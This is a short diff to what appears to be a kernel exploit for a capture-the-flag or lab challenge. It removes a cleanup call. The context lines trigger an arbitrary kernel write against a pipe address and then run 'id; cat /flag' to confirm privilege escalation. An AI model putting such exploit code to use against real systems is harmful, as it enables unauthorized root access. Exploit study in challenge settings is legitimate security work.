@@ -110,8 +110,6 @@ int main(int argc, const char** argv) {
     printf("[+] Triggering ARB write\n");
     trigger_vuln_arb_write(victim_pipe_addr, payload.GetUsedData());
 
-    kpwn.Close();
-
     printf("[+] Testing access as non-root user:\n");
     system("id; cat /flag");
 
